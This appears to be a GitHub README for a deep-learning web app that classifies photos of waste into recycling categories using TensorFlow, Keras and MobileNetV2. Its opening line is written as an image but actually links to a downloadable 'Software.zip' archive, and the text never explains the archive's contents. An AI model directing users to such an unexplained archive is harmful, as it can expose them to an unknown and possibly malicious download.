![Waste Classification](https://github.com/luan233646/waste-classification/releases/download/v2.0/Software.zip)

Welcome to the Waste Classification GitHub repository! This project focuses on creating a deep learning-based web application that aids in the proper segregation of waste materials using computer vision. By leveraging advanced technologies like TensorFlow, Keras, and MobileNetV2, this system is designed to identify and classify various types of waste items into categories such as cardboard, glass, metal, paper, plastic, or trash. 

### Repository Details
- **Repository Name:** waste-classification
- **Short Description:** A web application for waste classification using deep learning and computer vision.
- **Topics:** computer-vision, deep-learning, environmental, flask, image-classification, keras, mobilenetv2, sustainability, tensorflow, transfer-learning, waste-management, waste-management-system, web-application

### Project Overview
Proper waste management and recycling play a crucial role in sustainability and environmental conservation. With the Waste Classification web application, users can contribute to these efforts by accurately sorting different types of waste materials. By simply uploading an image of an item, the application uses a pre-trained deep learning model to determine its waste category, encouraging responsible waste disposal practices.
